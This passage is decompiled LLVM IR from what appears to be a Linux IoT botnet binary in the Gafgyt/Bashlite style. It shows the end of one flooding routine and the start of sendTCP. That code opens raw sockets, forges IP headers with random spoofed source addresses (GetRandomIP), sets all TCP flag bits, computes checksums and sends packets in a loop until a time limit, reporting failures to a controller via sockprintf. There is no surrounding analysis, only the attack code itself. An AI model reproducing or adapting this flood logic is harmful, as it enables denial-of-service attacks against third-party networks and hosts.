  %stack_var_-104.0 = phi i16 [ %storemerge, %dec_label_pc_804e72c ], [ %stack_var_-104.0.ph, %dec_label_pc_804e669.outer ]
  store i32 %v2_804e54f, i32* %edx.global-to-local, align 4
  %v0_804e66f = load i32, i32* @esp, align 4
  %v1_804e66f = add i32 %v0_804e66f, 20
  %v2_804e66f = inttoptr i32 %v1_804e66f to i32*
  store i32 16, i32* %v2_804e66f, align 4
  %v1_804e677 = load i32, i32* @esp, align 4
  %v2_804e677 = add i32 %v1_804e677, 16
  %v3_804e677 = inttoptr i32 %v2_804e677 to i32*
  store i32 %v2_804e2be, i32* %v3_804e677, align 4
  %v0_804e67b = load i32, i32* @esp, align 4
  %v1_804e67b = add i32 %v0_804e67b, 12
  %v2_804e67b = inttoptr i32 %v1_804e67b to i32*
  store i32 0, i32* %v2_804e67b, align 4
  %v1_804e686 = load i32, i32* @esp, align 4
  %v2_804e686 = add i32 %v1_804e686, 8
  %v3_804e686 = inttoptr i32 %v2_804e686 to i32*
  store i32 %v1_804e52b, i32* %v3_804e686, align 4
  %v0_804e68a = load i32, i32* %edx.global-to-local, align 4
  %v1_804e68a = load i32, i32* @esp, align 4
  %v2_804e68a = add i32 %v1_804e68a, 4
  %v3_804e68a = inttoptr i32 %v2_804e68a to i32*
  store i32 %v0_804e68a, i32* %v3_804e68a, align 4
  store i32 %v4_804e450, i32* %eax.global-to-local, align 4
  %v1_804e691 = load i32, i32* @esp, align 4
  %v2_804e691 = inttoptr i32 %v1_804e691 to i32*
  store i32 %v4_804e450, i32* %v2_804e691, align 4
  %v6_804e694 = call i32 @__libc_sendto(i32 %stack_var_-80.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804e694, i32* %eax.global-to-local, align 4
  %v1_804e699 = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  %v1_804e69e = urem i32 %v1_804e699, 65536
  store i32 %v1_804e69e, i32* %edx.global-to-local, align 4
  store i32 %v1_804e567, i32* %eax.global-to-local, align 4
  %v1_804e6a4 = trunc i32 %v1_804e699 to i16
  store i16 %v1_804e6a4, i16* %v5_804e56a, align 4
  br i1 %v1_804e299, label %dec_label_pc_804e6ba, label %dec_label_pc_804e6ad

dec_label_pc_804e6ad:                             ; preds = %dec_label_pc_804e669
  %v1_804e6ad = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  br label %dec_label_pc_804e6ce

dec_label_pc_804e6ba:                             ; preds = %dec_label_pc_804e669
  store i32 %v1_804e6bd.pre-phi, i32* %eax.global-to-local, align 4
  %v1_804e6c0 = load i32, i32* @esp, align 4
  %v2_804e6c0 = inttoptr i32 %v1_804e6c0 to i32*
  store i32 %v1_804e6bd.pre-phi, i32* %v2_804e6c0, align 4
  %v3_804e6c3 = call i32 @htons(i16 %stack_var_-104.0)
  br label %dec_label_pc_804e6ce

dec_label_pc_804e6ce:                             ; preds = %dec_label_pc_804e6ad, %dec_label_pc_804e6ba
  %storemerge10.in = phi i32 [ %v1_804e6ad, %dec_label_pc_804e6ad ], [ %v3_804e6c3, %dec_label_pc_804e6ba ]
  %storemerge = trunc i32 %storemerge10.in to i16
  store i32 %v1_804e567, i32* %eax.global-to-local, align 4
  %sext11 = mul i32 %storemerge10.in, 65536
  %v4_804e6d1 = sdiv i32 %sext11, 65536
  store i32 %v4_804e6d1, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804e603, align 2
  %v2_804e6d8 = call i32 @rand_cmwc(i32 %v4_804e6d1)
  %v1_804e6dd = urem i32 %v2_804e6d8, 65536
  store i32 %v1_804e6dd, i32* %edx.global-to-local, align 4
  %v1_804e6e3 = trunc i32 %v2_804e6d8 to i16
  store i16 %v1_804e6e3, i16* %v4_804e6e3, align 4
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v1_804e6ea = load i32, i32* @esp, align 4
  %v2_804e6ea = inttoptr i32 %v1_804e6ea to i32*
  store i32 %storemerge6, i32* %v2_804e6ea, align 4
  %v3_804e6ed = call i32 @GetRandomIP(i32 %v4_804e6d1, i32 %v13_804e28c)
  store i32 %v3_804e6ed, i32* %eax.global-to-local, align 4
  %v1_804e6f2 = load i32, i32* @esp, align 4
  %v2_804e6f2 = inttoptr i32 %v1_804e6f2 to i32*
  store i32 %v3_804e6ed, i32* %v2_804e6f2, align 4
  %v0_804e6f5 = call i32 @htonl()
  store i32 %v0_804e6f5, i32* %edx.global-to-local, align 4
  store i32 %v0_804e6f5, i32* %v3_804e6ff, align 4
  store i32 %v2_804e54f, i32* %eax.global-to-local, align 4
  %v3_804e705 = load i16, i16* %v2_804e628, align 2
  %v4_804e705 = zext i16 %v3_804e705 to i32
  store i32 %v4_804e705, i32* %edx.global-to-local, align 4
  store i32 %v2_804e54f, i32* %eax.global-to-local, align 4
  %v1_804e70e = load i32, i32* @esp, align 4
  %v2_804e70e = add i32 %v1_804e70e, 4
  %v3_804e70e = inttoptr i32 %v2_804e70e to i32*
  store i32 %v4_804e705, i32* %v3_804e70e, align 4
  %v0_804e712 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e712 = load i32, i32* @esp, align 4
  %v2_804e712 = inttoptr i32 %v1_804e712 to i32*
  store i32 %v0_804e712, i32* %v2_804e712, align 4
  %v3_804e715 = inttoptr i32 %v4_804e6d1 to i16*
  %v4_804e715 = call i32 @csum(i16* %v3_804e715, i32 %v13_804e28c)
  %v1_804e71a = urem i32 %v4_804e715, 65536
  store i32 %v1_804e71a, i32* %edx.global-to-local, align 4
  %v1_804e720 = trunc i32 %v4_804e715 to i16
  store i16 %v1_804e720, i16* %v4_804e643, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804e727 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804e72a = icmp eq i1 %v15_804e727, false
  br i1 %v1_804e72a, label %dec_label_pc_804e749, label %dec_label_pc_804e72c

dec_label_pc_804e72c:                             ; preds = %dec_label_pc_804e6ce
  %v0_804e72c = load i32, i32* @esp, align 4
  %v1_804e72c = inttoptr i32 %v0_804e72c to i32*
  store i32 0, i32* %v1_804e72c, align 4
  %v2_804e733 = inttoptr i32 %v4_804e6d1 to i32*
  %v3_804e733 = call i32 @__GI_time(i32* %v2_804e733)
  store i32 %v3_804e733, i32* %eax.global-to-local, align 4
  %v8_804e73b = icmp sgt i32 %v3_804e733, %v5_804e653
  br i1 %v8_804e73b, label %dec_label_pc_804e779, label %dec_label_pc_804e669

dec_label_pc_804e749:                             ; preds = %dec_label_pc_804e6ce
  %v4_804e749 = add i32 %stack_var_-84.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804e74f = icmp eq i32 %stack_var_-80.0.ph, %arg7
  %v1_804e752 = icmp eq i1 %v15_804e74f, false
  br i1 %v1_804e752, label %dec_label_pc_804e771, label %dec_label_pc_804e754

dec_label_pc_804e754:                             ; preds = %dec_label_pc_804e749
  store i32 %v4_804e757, i32* %eax.global-to-local, align 4
  %v1_804e75d = load i32, i32* @esp, align 4
  %v2_804e75d = inttoptr i32 %v1_804e75d to i32*
  store i32 %v4_804e757, i32* %v2_804e75d, align 4
  %v1_804e760 = sext i32 %v4_804e749 to i64
  %v2_804e760 = call i32 @usleep(i64 %v1_804e760)
  store i32 %v2_804e760, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e669.outer

dec_label_pc_804e771:                             ; preds = %dec_label_pc_804e749
  %v4_804e771 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804e669.outer

dec_label_pc_804e779:                             ; preds = %dec_label_pc_804e72c, %dec_label_pc_804e4ad, %dec_label_pc_804e45e
  %v0_804e78228 = phi i32 [ %v3_804e4bd, %dec_label_pc_804e4ad ], [ %v3_804e46e, %dec_label_pc_804e45e ], [ %v3_804e733, %dec_label_pc_804e72c ]
  br label %dec_label_pc_804e77c

dec_label_pc_804e77c:                             ; preds = %dec_label_pc_804e3e6, %dec_label_pc_804e33d, %dec_label_pc_804e2be, %dec_label_pc_804e323, %dec_label_pc_804e779
  %v0_804e782 = phi i32 [ 0, %dec_label_pc_804e33d ], [ %v4_804e2ce, %dec_label_pc_804e2be ], [ %v3_804e333, %dec_label_pc_804e323 ], [ %v0_804e78228, %dec_label_pc_804e779 ], [ %v2_804e3ed, %dec_label_pc_804e3e6 ]
  store i32 %v0_804e28b, i32* @ebx, align 4
  ret i32 %v0_804e782

; uselistorder directives
  uselistorder i32 %v4_804e749, { 2, 1, 0 }
  uselistorder i32 %v4_804e715, { 1, 0 }
  uselistorder i32 %v2_804e6d8, { 1, 0 }
  uselistorder i32 %v4_804e6d1, { 4, 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 3, 1, 0, 2 }
  uselistorder i32 %v1_804e699, { 1, 0 }
  uselistorder i32 %stack_var_-84.0, { 1, 0 }
  uselistorder i32 %stack_var_-80.0.ph, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v5_804e638, { 1, 0 }
  uselistorder i32 %v4_804e600, { 2, 1, 0 }
  uselistorder i32 %v1_804e6bd.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804e5ec, { 2, 1, 0 }
  uselistorder i32 %v2_804e5c8, { 1, 0 }
  uselistorder i32 %v3_804e5b9, { 1, 0 }
  uselistorder i32 %v1_804e5b3, { 1, 0 }
  uselistorder i32 %v2_804e54f, { 10, 9, 8, 18, 17, 16, 7, 6, 15, 5, 14, 13, 12, 11, 3, 4, 2, 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804e521, { 1, 0 }
  uselistorder i32 %v4_804e450, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %v4_804e404, { 1, 0 }
  uselistorder i32 %stack_var_-92.0, { 1, 0 }
  uselistorder i32 %stack_var_-88.0.ph, { 1, 0 }
  uselistorder i32 %v1_804e344, { 1, 3, 2, 0, 5, 4, 6, 7 }
  uselistorder i32 %v1_804e340, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_804e315, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_804e2be, { 1, 0 }
  uselistorder i32 %v1_804e2ac, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 11, 3, 4, 5, 6, 10, 7, 8, 9, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 33, 32, 35, 34, 36, 37, 39, 38, 42, 40, 41, 44, 43, 47, 45, 46, 50, 48, 49, 52, 51, 53, 54, 55, 56, 58, 57, 59 }
  uselistorder i32 %arg7, { 0, 3, 1, 2 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e77c, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804e6ce, { 1, 0 }
  uselistorder label %dec_label_pc_804e669, { 1, 0 }
  uselistorder label %dec_label_pc_804e669.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e5fd, { 1, 0 }
  uselistorder label %dec_label_pc_804e528, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_804e4d0, { 1, 0 }
  uselistorder label %dec_label_pc_804e3e6, { 1, 0 }
  uselistorder label %dec_label_pc_804e39c, { 1, 0 }
  uselistorder label %dec_label_pc_804e39c.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e2be, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp39 = call i16 @__decompiler_undefined_function_5()
  %tmp40 = call i32 @__decompiler_undefined_function_0()
  %tmp41 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_804e787 = load i32, i32* @esi, align 4
  %v0_804e788 = load i32, i32* @ebx, align 4
  %v15_804e789 = ptrtoint i32* %stack_var_-188 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e7a0 = icmp eq i32 %arg2, 0
  %v1_804e7a4 = icmp eq i1 %v4_804e7a0, false
  br i1 %v1_804e7a4, label %dec_label_pc_804e7b4, label %dec_label_pc_804e7a6

dec_label_pc_804e7a6:                             ; preds = %entry
  %v1_804e7a6 = call i32 @rand_cmwc(i32 %v15_804e789)
  br label %dec_label_pc_804e7c9

dec_label_pc_804e7b4:                             ; preds = %entry
  %v1_804e7b7 = urem i32 %arg2, 65536
  store i32 %v1_804e7b7, i32* %eax.global-to-local, align 4
  store i32 %v1_804e7b7, i32* %stack_var_-188, align 4
  %v1_804e7bd = trunc i32 %arg2 to i16
  %v2_804e7bd = call i32 @htons(i16 %v1_804e7bd)
  br label %dec_label_pc_804e7c9

dec_label_pc_804e7c9:                             ; preds = %dec_label_pc_804e7a6, %dec_label_pc_804e7b4
  %v2_804e7c9 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804e7cc = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804e7cc, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-188, align 4
  %v4_804e7d9 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v4_804e7d9, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e7de = icmp eq i32 %v4_804e7d9, 0
  br i1 %v1_804e7de, label %dec_label_pc_804e7e7, label %dec_label_pc_804ed40

dec_label_pc_804e7e7:                             ; preds = %dec_label_pc_804e7c9
  %v5_804e7ea = icmp ugt i32* %stack_var_-60, inttoptr (i32 -9 to i32*)
  store i1 %v5_804e7ea, i1* %cf.global-to-local, align 1
  %v15_804e7ea = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804e7ea, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 2, i32* %stack_var_-188, align 4
  %v4_804e811 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v4_804e811, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e819 = icmp eq i32 %v4_804e811, 0
  %v1_804e81d = icmp eq i1 %v4_804e819, false
  br i1 %v1_804e81d, label %dec_label_pc_804e839, label %dec_label_pc_804e81f

dec_label_pc_804e81f:                             ; preds = %dec_label_pc_804e7e7
  %v0_804e81f = load i32, i32* @global_var_805c520.20, align 32
  store i32 %v0_804e81f, i32* %eax.global-to-local, align 4
  store i32 %v0_804e81f, i32* %stack_var_-188, align 4
  %v3_804e82f = call i32 @sockprintf(i32 %v0_804e81f, i32 ptrtoint ([27 x i8]* @global_var_80595d0.303 to i32))
  store i32 %v3_804e82f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed40

dec_label_pc_804e839:                             ; preds = %dec_label_pc_804e7e7
  store i32 1, i32* %stack_var_-64, align 4
  %v2_804e848 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v4_804e811, i32* %eax.global-to-local, align 4
  store i32 %v4_804e811, i32* %stack_var_-188, align 4
  %v6_804e865 = call i32 @__GI_setsockopt(i32 %v4_804e811, i32 0, i32 3, i32 %v2_804e848, i32 4)
  store i32 %v6_804e865, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804e86a = icmp slt i32 %v6_804e865, 0
  %v1_804e86c = icmp eq i1 %v2_804e86a, false
  br i1 %v1_804e86c, label %dec_label_pc_804e888, label %dec_label_pc_804e86e

dec_label_pc_804e86e:                             ; preds = %dec_label_pc_804e839
  %v0_804e86e = load i32, i32* @global_var_805c520.20, align 32
  store i32 %v0_804e86e, i32* %eax.global-to-local, align 4
  store i32 %v0_804e86e, i32* %stack_var_-188, align 4
  %v3_804e87e = call i32 @sockprintf(i32 %v0_804e86e, i32 ptrtoint ([33 x i8]* @global_var_80595ec.304 to i32))
  store i32 %v3_804e87e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed40

dec_label_pc_804e888:                             ; preds = %dec_label_pc_804e839
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e888 = icmp eq i32 %arg4, 0
  %v1_804e88c = icmp eq i1 %v4_804e888, false
  br i1 %v1_804e88c, label %dec_label_pc_804e897, label %dec_label_pc_804e8ad

dec_label_pc_804e897:                             ; preds = %dec_label_pc_804e888
  %v5_804e89e = sub i32 32, %arg4
  %v10_804e89e = icmp ugt i32 %arg4, 32
  store i1 %v10_804e89e, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804e8a6 = urem i32 %v5_804e89e, 32
  %v4_804e8a6 = icmp eq i32 %v2_804e8a6, 0
  br i1 %v4_804e8a6, label %bb90, label %bb

bb:                                               ; preds = %dec_label_pc_804e897
  %v5_804e8a6 = shl i32 1, %v2_804e8a6
  store i32 %v5_804e8a6, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb90

bb90:                                             ; preds = %dec_label_pc_804e897, %bb
  %v0_804e8a8 = phi i32 [ 1, %dec_label_pc_804e897 ], [ %v5_804e8a6, %bb ]
  %v1_804e8a8 = sub i32 0, %v0_804e8a8
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804e8a8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e8ad

dec_label_pc_804e8ad:                             ; preds = %dec_label_pc_804e888, %bb90
  %storemerge10 = phi i32 [ %v1_804e8a8, %bb90 ], [ 0, %dec_label_pc_804e888 ]
  %v1_804e8b0 = add i32 %arg6, 40
  %v1_804e8bc = add i32 %arg6, 70
  %v2_804e8bf = and i32 %v1_804e8bc, -16
  %v0_804e8c5 = load i32, i32* @esp, align 4
  %v2_804e8c5 = sub i32 %v0_804e8c5, %v2_804e8bf
  %v1_804e8c7 = add i32 %v2_804e8c5, 24
  store i32 %v1_804e8c7, i32* %edx.global-to-local, align 4
  %v1_804e8d1 = add i32 %v2_804e8c5, 39
  %v2_804e8d4 = and i32 %v1_804e8d1, -16
  %v1_804e8ec = add i32 %v2_804e8d4, 20
  %v5_804e8ef = inttoptr i32 %v1_804e8ec to i16*
  %v1_804e8f5 = add i32 %arg6, 20
  %v5_804e8f5 = icmp ugt i32 %arg6, -21
  store i1 %v5_804e8f5, i1* %cf.global-to-local, align 1
  store i32 %v1_804e8f5, i32* @ebx, align 4
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v2_804e8fd = inttoptr i32 %v2_804e8c5 to i32*
  store i32 %storemerge10, i32* %v2_804e8fd, align 4
  %v2_804e900 = call i32 @GetRandomIP(i32 %v1_804e8b0, i32 %v2_804e8d4)
  store i32 %v2_804e900, i32* %eax.global-to-local, align 4
  %v1_804e905 = load i32, i32* @esp, align 4
  %v2_804e905 = inttoptr i32 %v1_804e905 to i32*
  store i32 %v2_804e900, i32* %v2_804e905, align 4
  %v0_804e908 = call i32 @htonl()
  %v3_804e90d = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804e90d, i32* %edx.global-to-local, align 4
  %v0_804e910 = load i32, i32* @ebx, align 4
  %v1_804e910 = load i32, i32* @esp, align 4
  %v2_804e910 = add i32 %v1_804e910, 16
  %v3_804e910 = inttoptr i32 %v2_804e910 to i32*
  store i32 %v0_804e910, i32* %v3_804e910, align 4
  %v0_804e914 = load i32, i32* @esp, align 4
  %v1_804e914 = add i32 %v0_804e914, 12
  %v2_804e914 = inttoptr i32 %v1_804e914 to i32*
  store i32 6, i32* %v2_804e914, align 4
  %v1_804e91c = load i32, i32* @esp, align 4
  %v2_804e91c = add i32 %v1_804e91c, 8
  %v3_804e91c = inttoptr i32 %v2_804e91c to i32*
  store i32 %v0_804e908, i32* %v3_804e91c, align 4
  %v0_804e920 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e920 = load i32, i32* @esp, align 4
  %v2_804e920 = add i32 %v1_804e920, 4
  %v3_804e920 = inttoptr i32 %v2_804e920 to i32*
  store i32 %v0_804e920, i32* %v3_804e920, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804e927 = load i32, i32* @esp, align 4
  %v2_804e927 = inttoptr i32 %v1_804e927 to i32*
  store i32 %v2_804e8d4, i32* %v2_804e927, align 4
  %v0_804e92a = call i32 @makeIPPacket()
  store i32 %v0_804e92a, i32* %eax.global-to-local, align 4
  %v2_804e92f = call i32 @rand_cmwc(i32 %v1_804e8ec)
  %v1_804e934 = urem i32 %v2_804e92f, 65536
  store i32 %v1_804e934, i32* %edx.global-to-local, align 4
  store i32 %v1_804e8ec, i32* %eax.global-to-local, align 4
  %v1_804e93a = trunc i32 %v2_804e92f to i16
  store i16 %v1_804e93a, i16* %v5_804e8ef, align 4
  %v2_804e93d = call i32 @rand_cmwc(i32 %v1_804e8ec)
  %v2_804e947 = add i32 %v2_804e8d4, 24
  %v3_804e947 = inttoptr i32 %v2_804e947 to i32*
  store i32 %v2_804e93d, i32* %v3_804e947, align 8
  store i32 %v1_804e8ec, i32* %eax.global-to-local, align 4
  %v1_804e94d = add i32 %v2_804e8d4, 28
  %v2_804e94d = inttoptr i32 %v1_804e94d to i32*
  store i32 0, i32* %v2_804e94d, align 4
  store i32 %v1_804e8ec, i32* %edx.global-to-local, align 4
  %v1_804e957 = add i32 %v2_804e8d4, 32
  %v2_804e957 = inttoptr i32 %v1_804e957 to i8*
  %v3_804e957 = load i8, i8* %v2_804e957, align 16
  %v2_804e95b = urem i8 %v3_804e957, 16
  %v2_804e95d = or i8 %v2_804e95b, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v2_804e95d, i8* %v2_804e957, align 16
  %v4_804e962 = ptrtoint i8* %arg5 to i32
  store i32 %v4_804e962, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e962, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805960d.305 to i32), i32* @edi, align 4
  %v7_804e980 = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805960d.305, i32 0, i32 0), i32 4)
  %v8_804e980 = urem i32 %v7_804e980, 2
  %v9_804e980 = icmp eq i32 %v8_804e980, 0
  %v0_804e982 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e982 = or i1 %v0_804e982, %v9_804e980
  %v3_804e982 = zext i1 %v2_804e982 to i32
  %v4_804e982 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e982 = and i32 %v4_804e982, -256
  %v6_804e982 = or i32 %v3_804e982, %v5_804e982
  %v7_804e982 = xor i32 %v6_804e982, 1
  store i32 %v7_804e982, i32* @edx, align 4
  %v3_804e988 = and i32 %v7_804e980, -256
  %v1_804e98a = trunc i32 %v7_804e982 to i8
  %v3_804e98a = zext i1 %v0_804e982 to i8
  %v4_804e98a = sub nsw i8 %v1_804e98a, %v3_804e98a
  %v15_804e98a = icmp eq i8 %v4_804e98a, 0
  %v20_804e98a = zext i8 %v4_804e98a to i32
  %v23_804e98a = or i32 %v20_804e98a, %v3_804e988
  store i32 %v23_804e98a, i32* @ecx, align 4
  %v2_804e98e = sext i8 %v4_804e98a to i32
  store i32 %v2_804e98e, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e993 = icmp eq i1 %v15_804e98a, false
  br i1 %v1_804e993, label %dec_label_pc_804e9d6, label %dec_label_pc_804e995

dec_label_pc_804e995:                             ; preds = %dec_label_pc_804e8ad
  store i32 %v1_804e8ec, i32* %edx.global-to-local, align 4
  %v1_804e998 = add i32 %v2_804e8d4, 33
  %v2_804e998 = inttoptr i32 %v1_804e998 to i8*
  %v3_804e998 = load i8, i8* %v2_804e998, align 1
  %v2_804e99c = or i8 %v3_804e998, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804e99c = zext i8 %v2_804e99c to i32
  store i32 %v7_804e99c, i32* %eax.global-to-local, align 4
  store i8 %v2_804e99c, i8* %v2_804e998, align 1
  store i32 %v1_804e8ec, i32* %edx.global-to-local, align 4
  %v3_804e9a4 = load i8, i8* %v2_804e998, align 1
  %v2_804e9a8 = or i8 %v3_804e9a4, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804e9a8 = zext i8 %v2_804e9a8 to i32
  store i32 %v7_804e9a8, i32* %eax.global-to-local, align 4
  store i8 %v2_804e9a8, i8* %v2_804e998, align 1
  store i32 %v1_804e8ec, i32* %edx.global-to-local, align 4
  %v3_804e9b0 = load i8, i8* %v2_804e998, align 1
  %v2_804e9b4 = or i8 %v3_804e9b0, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804e9b4 = zext i8 %v2_804e9b4 to i32
  store i32 %v7_804e9b4, i32* %eax.global-to-local, align 4
  store i8 %v2_804e9b4, i8* %v2_804e998, align 1
  store i32 %v1_804e8ec, i32* %edx.global-to-local, align 4
  %v3_804e9bc = load i8, i8* %v2_804e998, align 1
  %v2_804e9c0 = or i8 %v3_804e9bc, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804e9c0 = zext i8 %v2_804e9c0 to i32
  store i32 %v7_804e9c0, i32* %eax.global-to-local, align 4
  store i8 %v2_804e9c0, i8* %v2_804e998, align 1
  store i32 %v1_804e8ec, i32* %edx.global-to-local, align 4
  %v3_804e9c8 = load i8, i8* %v2_804e998, align 1
  %v2_804e9cc = or i8 %v3_804e9c8, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804e9cc = zext i8 %v2_804e9cc to i32
  store i32 %v7_804e9cc, i32* %eax.global-to-local, align 4
  store i8 %v2_804e9cc, i8* %v2_804e998, align 1
  %v0_804ebac.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804ebac

dec_label_pc_804e9d6:                             ; preds = %dec_label_pc_804e8ad
  store i32 %v4_804e962, i32* @eax, align 4
  %v0_804e9d9 = load i32, i32* @esp, align 4
  %v1_804e9d9 = add i32 %v0_804e9d9, 4
  %v2_804e9d9 = inttoptr i32 %v1_804e9d9 to i32*
  store i32 ptrtoint (i32* @global_var_8059611.306 to i32), i32* %v2_804e9d9, align 4
  %v0_804e9e1 = load i32, i32* @eax, align 4
  %v1_804e9e1 = load i32, i32* @esp, align 4
  %v2_804e9e1 = inttoptr i32 %v1_804e9e1 to i32*
  store i32 %v0_804e9e1, i32* %v2_804e9e1, align 4
  %v3_804e9e4 = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_805960d.305 to i32))
  store i32 %v3_804e9e4, i32* %eax.global-to-local, align 4
  %v5_804e9e9 = inttoptr i32 %v3_804e9e4 to i8*
  store i8* %v5_804e9e9, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804eba217 = icmp eq i32 %v3_804e9e4, 0
  %v1_804eba624 = icmp eq i1 %v5_804eba217, false
  br i1 %v1_804eba624, label %dec_label_pc_804e9f1.lr.ph, label %dec_label_pc_804ebac

dec_label_pc_804e9f1.lr.ph:                       ; preds = %dec_label_pc_804e9d6
  %v1_804eb62 = add i32 %v2_804e8d4, 33
  %v2_804eb62 = inttoptr i32 %v1_804eb62 to i8*
  %tmp91 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804e9f1

dec_label_pc_804e9f1:                             ; preds = %dec_label_pc_804e9f1.lr.ph, %dec_label_pc_804eb8b
  %v3_804eb74 = phi i8* [ %v5_804e9e9, %dec_label_pc_804e9f1.lr.ph ], [ %tmp92, %dec_label_pc_804eb8b ]
  %stack_var_-160.126 = phi i32 [ %tmp40, %dec_label_pc_804e9f1.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804eb8b ]
  %stack_var_-156.125 = phi i8* [ %tmp41, %dec_label_pc_804e9f1.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804eb8b ]
  %v4_804e9f1 = ptrtoint i8* %v3_804eb74 to i32
  store i32 %v4_804e9f1, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e9f1, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8059613.307 to i32), i32* @edi, align 4
  %v7_804ea0f = call i32 @_strncmp(i8* %v3_804eb74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059613.307, i32 0, i32 0), i32 4)
  %v8_804ea0f = urem i32 %v7_804ea0f, 2
  %v9_804ea0f = icmp eq i32 %v8_804ea0f, 0
  %v0_804ea11 = load i1, i1* %cf.global-to-local, align 1
